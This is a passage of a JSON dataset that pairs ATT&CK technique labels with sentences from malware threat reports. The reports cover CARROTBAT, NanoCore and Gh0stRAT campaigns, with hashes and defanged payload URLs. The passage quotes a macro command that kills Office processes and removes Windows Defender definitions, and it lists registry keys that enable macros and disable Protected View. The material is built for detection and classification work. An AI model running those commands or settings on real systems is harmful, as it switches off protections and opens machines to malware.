      "CARROTBAT Samples d34aabf20ccd93df9d43838cea41a7e243009a3ef055966cb9dea75d84b2724d 8b6b4a0e0945c6daf3ebc8870e3bd37e54751f95162232d85dc0a0cc8bead9aa 26fc6fa6acc942d186a31dc62be0de5e07d6201bdff5d7b2f1a7521d1d909847 e218b19252f242a8f10990ddb749f34430d3d7697cbfb6808542f609d2cbf828 824f79a8ee7d8a23a0371fab83de44db6014f4d9bdea90b47620064e232fd3e3 70106ebdbf4411c32596dae3f1ff7bf192b81b0809f8ed1435122bc2a33a2e22 87c50166f2ac41bec7b0f3e3dba20c7264ae83b13e9a6489055912d4201cbdfc ac23017efc19804de64317cbc90efd63e814b5bb168c300cfec4cfdedf376f4f d965627a12063172f12d5375c449c3eef505fde1ce4f5566e27ef2882002b5d0 7d443434c302431734caf1d034c054ad80493c4c703d5aaeafa4a931a496b2ae 1142dcc02b9ef34dca2f28c22613a0489a653eb0aeafe1370ca4c00200d479e0 337b8c2aac80a44f4e7f253a149c65312bc952661169066fe1d4c113348cc27b 92b45e9a3f26b2eef4a86f3dae029f5821cffec78c6c64334055d75dbf2a62ef 42e18ef3aaadac5b40a37ec0b3686c0c2976d65c978a2b685fefe50662876ded ba78f0a6ce53682942e97b5ad7ec76a2383468a8b6cd5771209812b6410f10cb dca9bd1c2d068fc9c84a754e4dcf703629fbe2aa33a089cb50a7e33e073f5cea 7d8376057a937573c099e3afe2d8e4b8ec8cb17e46583a2cab1a4ac4b8be1c97 3cbccb059225669dcfdc7542ce28666e0b1a227714eaf4b16869808bffe90b96 aef92be267a05cbff83aec0f23d33dfe0c4cdc71f9a424f5a2e59ba62b7091de 2547b958f7725539e9bba2a1852a163100daa1927bb621b2837bb88007857a48 6c591dddd05a2462e252997dc9d1ba09a9d9049df564d00070c7da36e526a66a 22b16fa7af7b51880faceb33dd556242331daf7b7749cabd9d7c9735fb56aa10 3869c738fa80b1e127f97c0afdb6c2e1c15115f183480777977b8422561980dd ba100e7bac8672b9fd73f2d0b7f419378f81ffb56830f6e27079cb4a064ba39a e527ade24beacb2ef940210ba9acb21073e2b0dadcd92f1b8f6acd72b523c828 9fa69bdc731015aa7bdd86cd311443e6f829fa27a9ba0adcd49fa773fb5e7fa9 ffd1e66c2385dae0bb6dda186f004800eb6ceaed132aec2ea42b1ddcf12a5c4e e3b45b2e5d3e37f8774ae22a21738ae345e44c07ff58f1ab7178a3a43590fddd a0f53abde0d15497776e975842e7df350d155b8e63d872a914581314aaa9c1dc \u00a0 SYSCON Payload Samples 5a2c53a20fd66467e87290f5845a5c7d6aa8d460426abd30d4a6adcffca06b8b fceceb104bed6c8e85fff87b1bf06fde5b4a57fe7240b562a51727a37034f659 fa712f2bebf30592dd9bba4fc3befced4c727b85a036550fc3ac70d1965f8de5 da94a331424bc1074512f12d7d98dc5d8c5028821dfcbe83f67f49743ae70652 2efdd25a8a8f21c661aab2d4110cd7f89cf343ec6a8674ff20a37a1750708f27 62886d8b9289bd92c9b899515ff0c12966b96dd3e4b69a00264da50248254bb7 f27d640283372eb805df794ae700c25f789d77165bb98b7174ee03a617a566d4 0bb099849ed7076177aa8678de65393ef0d66e026ad5ab6805c1c47222f26358 f4c00cc0d7872fb756e2dc902f1a22d14885bf283c8e183a81b2927b363f5084 e8381f037a8f70d8fc3ee11a7bec98d6406a289e1372c8ce21cf00e55487dafc 1c8351ff968f16ee904031f6fba8628af5ca0db01b9d775137076ead54155968 2da750b50ac396a41e99752d791d106b686be10c27c6933f0d3afe762d6d0c48 5d1388c23c94489d2a166a429b8802d726298be7eb0c95585f2759cebad040cf 0490e7d24defc2f0a4239e76197f1cba50e7ce4e092080d2f7db13ea0f88120b \u00a0 OceanSalt Payload Samples 59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005 7cf37067f08b0b8f9c58a35d409fdd6481337bdc2d5f2152f8e8f304f8a472b6 fe8d65287dd40ca0a1fadddc4268268b4a77cdb04a490c1a73aa15b6e4f1dd63 a23f95b4a602bdaef1b58e97843e2f38218554eb57397210a1aaa68508843bd0 59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005 cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62 7ae933ed7fc664df4865840f39bfeaf9daeb3b88dcd921a90366635d59bc15f2 3663e7b197efe91fb7879a56c29fb8ed196815e0145436ee2fad5825c29de897 59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005 7ae933ed7fc664df4865840f39bfeaf9daeb3b88dcd921a90366635d59bc15f2 cf31dac47680ff1375ddaa3720892ed3a7a70d1872ee46e6366e6f93123f58d2 fe186d04ca6afec2578386b971b5ecb189d8381be055790a9e6f78b3f23c9958 \u00a0 Infrastructure https://881.000webhostapp[.]com/1.txt http://attach10132.1apps[.]com/1.txt https://071790.000webhostapp[.]com/1.txt https://vnik.000webhostapp[.]com/1.txt https://7077.000webhostapp[.]com/vic/1.txt http://a7788.1apps[.]com/att/1.txt http://s8877.1apps[.]com/vip/1.txt http://hanbosston.000webhostapp[.]com/1.txt http://bluemountain.1apps[.]com/1.txt https://www.webmail-koryogroup[.]com/keep/1.txt http://filer1.1apps[.]com/1.txt ftp.byethost7[.]com ftp.byethost10[.]com files.000 webhost[.]com 61.14.210[.]72:7117 The post The Fractured Block Campaign: CARROTBAT Used to Deliver Malware Targeting Southeast Asia appeared first on Unit42."
    ]
  },
  "process hollowing spearphishing link fallback channels-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "phishing: spearphishing link",
      "fallback channels"
    ],
    "sentances": [
      "An example of a domain structure and malware delivery contents is shown in the following table: \u00a0    SHA-256 Infrastructure URL   4e4967e3d39256049bc1054b966e5c609245fd3b2a934fda5cd1885526d8221e stemtopx[.]com/work/1.doc   d2f58b08f8abfe5055f3c1f0b8d991dfe1deb62807a5336b134ce2fb36d87284 stemtopx[.]com/work/3.exe   db4d8d931f1b979cf32d311f9b03e851d3283b4f7e86252730247da25cf9f093 stemtopx[.]com/work/2.exe   4c6e3d8fdb2394edffe4a5bc45a238749e929301efa8bcfa3a247b1ab68eac54 stemtopx[.]com/work/1.exe   81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/new/20.exe   26151f1e24bc97532e49013fbe04919de1f51e346dba1f10ce2e389160f2fb9d stemtopx[.]com/work/new/3.exe   a100ce0a67c5890bcc38d2b6e30f9164dfe266126ec40a2fd7eb8e941dc7d025 stemtopx[.]com/work/new/2.exe   806098afc2148dabb838b24c4dfaa148269ac3ddf769aee54e75d46bfef0c506 stemtopx[.]com/work/doc/20.doc   bf37d6cb393b440f790ad2b333624fde079e10bfaeb44d65188e3ccc551c982f stemtopx[.]com/work/k/1.docx   81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/k/1s.exe     Table 1"
    ]
  },
  "process injection remote file copy-multi": {
    "technique_names": ["process injection", "ingress tool transfer"],
    "sentances": [
      "The infection process is rather interesting, as it involves multiple layers of .NET assemblies that will eventually download the NanoCore remote administration tool (RAT) from a remote server and inject it into another process"
    ]
  },
  "process hollowing masquerading modify registry-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "masquerading",
      "modify registry"
    ],
    "sentances": [
      "The macro performs all of these activities with the following command:cmd /c taskkill /f /im winword.exe&taskkill /f /im Excel.exe&taskkill  /f /im MSPUB.exe&taskkill /f /im POWERPNT.EXE&taskkill /f /im  MSASCuiL.exe&taskkill /f /im MpCmdRun.exe&cd \"\"%ProgramFiles%\\Windows  Defender\"\" & MpCmdRun.exe -removedefinitions -dynamicsignatures & exitThe macro also attempts to deactivate security mechanisms within Microsoft Office products by modifying the registry"
    ]
  },
  "code signing security software discovery data from local system binary padding modify registry spearphishing attachment virtualization/sandbox evasion user execution exploitation for client execution-multi": {
    "technique_names": [
      "subvert trust controls: code signing",
      "software discovery: security software discovery",
      "data from local system",
      "obfuscated files or information: binary padding",
      "modify registry",
      "phishing: spearphishing attachment",
      "user execution",
      "exploitation for client execution",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "First, the macro attempts to enable macros in multiple versions of Word, PowerPoint, Publisher and Excel by setting the following registry keys to the value of 1:HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\11.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarningsThe macro also attempts to disable protections provided by the Protected View capability within Word, Excel, and PowerPoint by setting the following registry keys to a value of 1:HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\u00a0 First Stage Payload The payload installed by the macro is a downloader Trojan written in VB.NET that downloads a secondary payload and decoy document"
    ]
  },
  "deobfuscate/decode files or information masquerading binary padding drive-by compromise-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "masquerading",
      "obfuscated files or information: binary padding",
      "drive-by compromise"
    ],
    "sentances": [
      "The following functions are called when the application attempts to initialize the menu:ETransaksi.Speed(); // Legitimate class, but method is the first  wrapped function that leads to malicious code ProjectData.EndApp(); // Closes the application before rest of  legitimate Sales System Application functions are calledThe \u201cSpeed\u201d method in the legitimate ETransaksi class contains legitimate code from the Sales System Application; however, the author of this tool includes this code in an if/else construct that bypasses these instructions by setting a false flag to skip the legitimate code and execute the next step to the malicious code"
    ]
  },
  "process hollowing registry run keys / startup folder-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "It then creates the following registry key to automatically run the Trojan each time the system starts: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\@RANDOM@ The main behavior carried out by this Trojan involves obtaining an embedded executable, hollowing the current Trojan, writing the new embedded executable to the process memory and calling a specific function in the newly written payload"
    ]
  },
  "standard application layer protocol spearphishing attachment file and directory discovery exfiltration over alternative protocol dll side-loading fallback channels commonly used port-multi": {
    "technique_names": [
      "application layer protocol",
      "phishing: spearphishing attachment",
      "file and directory discovery",
      "exfiltration over alternative protocol",
      "hijack execution flow: dll side-loading",
      "fallback channels",
      "non-standard port"
    ],
    "sentances": [
      "This variant of NanoCore was configured to communicate with the following IP address as its C2 server over TCP port 6666: \u00a0 115.186.136[.]237 \u00a0 Bitly short URLs and expanded domains    Short Bitly URL Expanded URL   http://bit[.]ly/Loaloding http://www.asaigoldenrice[.]com/daq/doc/2.doc   http://bit[.]ly/Loadingnnsa http://onedrivenet[.]xyz/work/docnew/4.doc   http://bit[.]ly/2JmQLW6 http://stemtopx[.]com/work/doc/13.doc   http://bit[.]ly/2JsruKm http://stemtopx[.]com/work/doc/4.doc   http://bit[.]ly/2GUaY49 http://fast-cargo[.]com/images/file/vb/VBS/doc/3.doc   http://bit[.]ly/Loadingnns http://onedrivenet[.]xyz/work/docnew/4.doc   http://bit[.]ly/2Im2IOF http://panelonetwothree[.]ml/zico/doc/doc8/zloadings.doc   http://bit[.]ly/primeload http://fast-cargo[.]com/images/file/vb/VBS/doc/1.doc   http://bit[.]ly/loader2018 http://asaigoldenrice[.]com/sim/new.doc   http://bit[.]ly/2xZ1kO6wdscsac http://stemtopx[.]com/work/doc/3.doc   http://bit[.]ly/2M2bIYh http://stemtopx[.]com/work/doc/root.doc   http://bit[.]ly/2r9PSIv http://stevemike-fireforce[.]info/work/doc/11.doc   http://bit[.]ly/Loadiendg http://www.0-day[.]us/img/doc/6.doc   http://bit[.]ly/2rpmJKsrdtrdtdfysersgerstrdFCGRDR http://stevemikeforce[.]com/work/doc/7.doc   http://bit[.]ly/2Fu4ZSfloading http://panelonetwothree[.]ml/zico/xe/snoop/ocsnoop/snoop.doc   http://bit[.]ly/2HloaderqVbva http://diamondfoxpanel[.]ml/doc/1/11.doc   http://bit[.]ly/Loardising http://onedrivenet[.]xyz/work/docnew/12.doc   http://bit[.]ly/2JB3KXD http://stemtopx[.]com/work/doc/8.doc   http://bit[.]ly/1_loadingH7TvJa http://diamondfoxpanel[.]ml/doc/1.doc   http://bit[.]ly/Loadijging http://onedrivenet[.]xyz/work/docnew/8.doc   http://bit[.]ly/Laodiingplease http://onedrivenet[.]xyz/work/docnew/13.doc   http://bit[.]ly/2HvQBirEam832ASADx http://stevemike-fireforce[.]info/work/dola/3.doc   http://bit[.]ly/2I5T7b9hgvgvjcVYVY http://stevemikeforce[.]com/work/doc/6.doc   http://bit[.]ly/paymentsuae http://brevini-france[.]cf/xp/doc/swift.doc   http://bit[.]ly/Laodingipleasewait http://www.asaigoldenrice[.]com/daq/doc/10.doc   http://bit[.]ly/loadingxxxx http://www.asaigoldenrice[.]com/daq/doc/4.doc   http://bit[.]ly/2Gmziko http://zupaservices[.]info/doc/z.doc   http://bit[.]ly/2sQhJOO http://stemtopx[.]com/work/doc/6.doc   http://bit[.]ly/laodinfokqaw http://stevemike-fireforce[.]info/work/doc/5.doc   http://bit[.]ly/loadrinfing http://www.asaigoldenrice[.]com/daq/doc/15.doc   http://bit[.]ly/2JaBgAS http://acorn-paper[.]com/administrator/help/7.doc   http://bit[.]ly/2loadingqlOQcM http://diamondfoxpanel[.]ml/doc/4/44.doc   http://bit[.]ly/loardding http://fast-cargo[.]com/images/file/vb/VBS/doc/11.doc   http://bit[.]ly/loidaring https://www.0-day[.]us/img/doc/5.doc   http://bit[.]ly/LoadingPleaseWait http://www.asaigoldenrice[.]com/daq/doc/20.doc   http://bit[.]ly/2HJv5Ud http://stevemike-fireforce[.]info/work/doc/1.doc   http://bit[.]ly/Loading13 http://fast-cargo[.]com/images/file/vb/VBS/doc/13.doc   http://bit[.]ly/2Lzpjp1 http://stemtopx[.]com/work/doc/19.doc   http://bit[.]ly/tt_seafood http://acorn-paper[.]com/administrator/help/en-GB/8.doc   http://bit[.]ly/Lording http://fast-cargo[.]com/images/file/vb/VBS/doc/7.doc   http://bit[.]ly/loadingsmins http://www.asaigoldenrice[.]com/daq/doc/1.doc   http://bit[.]ly/2_loadingJwkhJA http://diamondfoxpanel[.]ml/doc/7.doc   http://bit[.]ly/Laodiingpleasesa http://onedrivenet[.]xyz/work/docnew/13.doc   http://bit[.]ly/2tnW5lu http://stemtopx[.]com/work/newdoc/1.doc   http://bit[.]ly/tt_loading http://acorn-paper[.]com/administrator/components/com_templates/4.doc   http://bit[.]ly/2wzkloading http://panelonetwothree[.]ml/zico/doc/zloading.doc   http://bit[.]ly/Loadingans http://onedrivenet[.]xyz/work/docnew/14.doc   http://bit[.]ly/2r9jLcQloading http://panelonetwothree[.]ml/zico/doc/zik.doc   http://bit[.]ly/loadingpleasewairrs http://stevemike-fireforce[.]info/work/dola/2.doc   http://bit[.]ly/2arubabKmpgwP http://panelonetwothree[.]ml/iran/uae/done/oc/uae.doc   http://bit[.]ly/2HAwzmN3290293sadjokwwadjoW http://stevemike-fireforce[.]info/work/doc/12.doc   http://bit[.]ly/loadingasz http://0-day[.]us/img/doc/10.doc   http://bit[.]ly/ntissa2vFamys http://acorn-paper[.]com/images/locations/thumbnails/oc/m.doc   http://bit[.]ly/2IgzmRxEmasidE9kEjidlE http://panelonetwothree[.]ga/work/doc/3.doc   http://bit[.]ly/2JqmuWp http://stemtopx[.]com/work/doc/16.doc   http://bit[.]ly/load242HmFqZ6 http://panelonetwothree[.]ml/simon/exp/oc/mm.doc   http://bit[.]ly/2L17QGqloading http://panelonetwothree[.]ml/zico/doc/doc8/zxloading.doc   http://bit[.]ly/2MarX5t http://stemtopx[.]com/work/doc/9.doc   http://bit[.]ly/Loadingnix http://www.asaigoldenrice[.]com/daq/doc/3.doc   http://bit[.]ly/2HyVGGy_loading http://panelonetwothree[.]ml/iran/uae/done/oc1/uae.doc   http://bit[.]ly/2H8euros http://acorn-paper[.]com/administrator/components/com_templates/views/2.doc   http://bit[.]ly/2I2mUBFstthdhtrhdtyftfyj http://stevemikeforce[.]com/work/doc/8.doc   http://bit[.]ly/Loininding http://www.0-day[.]us/img/doc/8.doc   http://bit[.]ly/2F02ZRq http://stevemike-fireforce[.]info/work/doc/2.doc   http://bit[.]ly/Loadingpleasewait http://onedrivenet[.]xyz/work/docnew/19.doc   http://bit[.]ly/2jE36KjhvjhgkHJHKLHGFHJ http://stevemikeforce[.]com/work/doc/3.doc   http://bit[.]ly/Waitpleasewait http://stevemike-fireforce[.]info/work/doc/8.doc   http://bit[.]ly/Loiading http://fast-cargo[.]com/images/file/newvbs/doc/1.doc   http://bit[.]ly/Loadingplasewaitsm http://stevemike-fireforce[.]info/work/doc/3.doc   http://bit[.]ly/2jCTHCNasiudhasdASdy7656basdu http://stevemikeforce[.]com/work/doc/2.doc   http://bit[.]ly/loadingpleaswaitrr http://stevemike-fireforce[.]info/work/doc/4.doc   http://bit[.]ly/Loadingnsi http://onedrivenet[.]xyz/work/docnew/2.doc   http://bit[.]ly/2JRUNKh http://www.stemtopx[.]com/work/newdoc/3.doc   http://bit[.]ly/2Hload25YdU19 http://panelonetwothree[.]ml/simon/exp/oc/25/m25.doc   http://bit[.]ly/2lording http://fast-cargo[.]com/images/file/vb/VBS/doc/8.doc   http://bit[.]ly/2M9lLL6 http://stemtopx[.]com/work/doc/15.doc   http://bit[.]ly/Loggeding http://fast-cargo[.]com/images/file/newvbs/doc/4.doc   http://bit[.]ly/Loadingwaitplez http://stevemike-fireforce[.]info/work/doc/10.doc   http://bit[.]ly/ASDj23234j4oDj3234Sdmk http://stevemike-fireforce[.]info/work/doc/5.doc   http://bit[.]ly/2JloadingspWgLs2 http://acorn-paper[.]com/components/com_content/models/oc/s.doc   http://bit[.]ly/Loadingpleasewaitnn http://stevemike-fireforce[.]info/work/dola/4.doc   http://bit[.]ly/2sPe3wZrdtrdytd http://stemtopx[.]com/work/doc/2.doc   http://bit[.]ly/LAdooing http://onedrivenet[.]xyz/work/docnew/6.doc   http://bit[.]ly/LoadIng http://guelphupholstery[.]com/images/yupsia/doc/62.doc   http://bit[.]ly/2JnMVQz http://stemtopx[.]com/work/doc/14.doc   http://bit[.]ly/DocumentIsLoadingPleasewait http://stemtopx[.]com/work/i/2.doc   http://bit[.]ly/2HVD1Bh http://fast-cargo[.]com/images/file/vb/VBS/doc/4.doc   http://bit[.]ly/2uoqexc http://zupaservices[.]info/doc/1.doc   http://bit[.]ly/2vXgnqdASdj2929iqwSdu9iw9i http://stevemike-fireforce[.]info/work/doc/13.doc   http://bit[.]ly/4_loadingEwHlnA http://diamondfoxpanel[.]ml/doc/4.doc   http://bit[.]ly/lLoadingl9 http://fast-cargo[.]com/images/file/vb/VBS/doc/9.doc   http://bit[.]ly/LlLoadinG https://www.0-day[.]us/img/doc/2.doc   http://bit[.]ly/2kTPwmFdrwfdtsfdfyr http://stemtopx[.]com/work/doc/1.doc   http://bit[.]ly/2G34tww http://fast-cargo[.]com/old/images/file/vb/VBS/smon/doc/testa.doc   http://bit[.]ly/2HvQBir http://stevemike-fireforce[.]info/work/dola/3.doc   http://bit[.]ly/golden_uae http://fast-cargo[.]com/old/images/file/vb/VBS/smon/doc/xchange.doc   http://bit[.]ly/pele2HROHp1 http://acorn-paper[.]com/images/locations/thumbnails/z/oc/z.doc   http://bit[.]ly/2rlqLDBMSloading http://panelonetwothree[.]ml/iran/uae/done/oc2/uae.doc   http://bit[.]ly/2JDUVMC http://stemtopx[.]com/work/doc/11.doc   http://bit[.]ly/2K1GYVgtyfctftfTFTYFUFtufutfu http://stevemikeforce[.]com/work/doc/11.doc   http://bit[.]ly/2Jr4dby http://stemtopx[.]com/work/doc/18.doc   http://bit[.]ly/2M9I8z4 http://stemtopx[.]com/work/newdoc/2.doc   http://bit[.]ly/ASD8239ASdmkWi38AS http://stevemike-fireforce[.]info/work/dola/4.doc   http://bit[.]ly/LoadingPelasewaits http://stevemike-fireforce[.]info/work/docnew/2.doc   http://bit[.]ly/2JnNtG7 http://stemtopx[.]com/work/doc/17.doc   http://bit[.]ly/shawclk2HZJXOr http://panelonetwothree[.]ml/simon/exp/25exp/26/doc/final/26.doc   http://bit[.]ly/loadijgng http://onedrivenet[.]xyz/work/docnew/9.doc   http://bit[.]ly/PleaseWaitLoading http://www.asaigoldenrice[.]com/daq/doc/7.doc   http://bit[.]ly/Loadinger http://onedrivenet[.]xyz/work/docnew/1.doc   http://bit[.]ly/Workingwait http://onedrivenet[.]xyz/work/docnew/21.doc   http://bit[.]ly/Loadingplzwait http://www.asaigoldenrice[.]com/daq/doc/5.doc   http://bit[.]ly/2HuOFBQ http://stemtopx[.]com/work/doc/5.doc   http://bit[.]ly/LoadingPleasewait1 http://onedrivenet[.]xyz/work/docnew/20.doc   http://bit[.]ly/LlOrRinding http://www.0-day[.]us/img/doc/11.doc   http://bit[.]ly/Loadingwaitplzz http://onedrivenet[.]xyz/work/docnew/16.doc   http://bit[.]ly/2HWdrzTgfufuyfkCTYTDFYTgtfutf http://stevemikeforce[.]com/work/doc/12.doc   http://bit[.]ly/2KHEnRKxestrhdyhdDTDRDTRthdydy http://stevemikeforce[.]com/work/doc/10.doc   http://bit[.]ly/unkwonas http://asaigoldenrice[.]com/sim/new.vbs   http://bit[.]ly/Laodiingpleasewait http://onedrivenet[.]xyz/work/docnew/13.doc   http://bit[.]ly/wordxchange http://asaigoldenrice[.]com/sim/doc/kalu.doc   http://bit[.]ly/Loadsinfpleasewait http://onedrivenet[.]xyz/work/docnew/30.docx   http://bit[.]ly/Loardsing http://www.0-day[.]us/img/doc/7.doc   http://bit[.]ly/2ImbyrQ http://acorn-paper[.]com/administrator/6.doc   http://bit[.]ly/LoadingPleasewait http://onedrivenet[.]xyz/work/docnew/20.doc    \u00a0 Domains For a list of domains encountered in use by malware throughout this campaign, please refer to the following file"
    ]
  },
  "dll search order hijacking dll side-loading exploitation for client execution-multi": {
    "technique_names": [
      "hijack execution flow: dll search order hijacking",
      "hijack execution flow: dll side-loading",
      "exploitation for client execution"
    ],
    "sentances": [
      "Exploits  CVE-2017-0143, SMB exploit CVE-2017-0146, SMB exploit  These 2 exploits are EternalBlue/Doublepulsar and are used to drop the Stage1 Dropper onto a system.\u00a0 Installation The Gh0stRAT dropper arrives on a PC through the use of EternalBlue/DoublePulsar.\u00a0 Once on a victim\u2019s PC, the dropper executable is launched and it decrypts and loads the Gh0stRAT DLL into memory.\u00a0 It then passes the config buffer to the extracted DLL and calls the exported function (Shellex)  [Screenshot 2] The mainthread of the code.\u00a0 Note the call at the bottom that calls Shellex Gh0stRAT dll functionality An important note:\u00a0 In its base state, this sample is damaged, therefore it will not install its services properly.\u00a0 However, as the service information is included, I will list it anyways.\u00a0 Additionally, samples downloaded from its distribution server DO install correctly,\u00a0 and are downloaded during the base dll\u2019s runtime"
    ]
  },
  "proxy data encoding-multi": {
    "technique_names": ["data encoding"],
    "sentances": [
